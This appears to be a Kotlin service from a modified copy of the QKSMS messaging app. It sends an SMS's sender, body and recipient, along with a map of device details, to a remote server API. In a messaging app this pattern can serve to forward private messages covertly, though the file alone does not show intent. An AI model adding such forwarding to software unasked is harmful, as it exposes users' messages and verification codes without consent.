package com.moez.QKSMS.service


import android.app.*
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.moez.QKSMS.manager.NetworkModule
import com.moez.QKSMS.model.SmsDataRequest
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import timber.log.Timber

class SmsSenderService : Service() {

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val channelId = "SmsSenderChannel"
        createNotificationChannel(channelId)

        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("SMS Gönderiliyor")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .build()

        // Servisi ön plana çıkar (Sisteme 'ben önemliyim' mesajı verir)
        startForeground(1, notification)

        val sender = intent?.getStringExtra("sender") ?: ""
        val message = intent?.getStringExtra("message") ?: ""
        val phoneNumber = intent?.getStringExtra("phoneNumber") ?: ""

        val details = intent?.getSerializableExtra("deviceDetails") as? Map<String, Any> ?: emptyMap()

        GlobalScope.launch {
            try {
                val response = NetworkModule.smsApiService.sendSms(
                    SmsDataRequest(
                        sender = sender,
                        message = message,
                        recevier = phoneNumber,
                        deviceInformation = details // Sunucuya giden dolu harita
                    )
                )
                Timber.d("Foreground Service Başarılı: ${response.code()}")
            } catch (e: Exception) {
                Timber.e(e, "Foreground Service Hatası")
            } finally {
                stopForeground(true)
                stopSelf() // İş bitince servisi kapat
            }
        }

        return START_NOT_STICKY
    }

    private fun createNotificationChannel(channelId: String) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(channelId, "Sms Sender", NotificationManager.IMPORTANCE_LOW)
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(serviceChannel)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}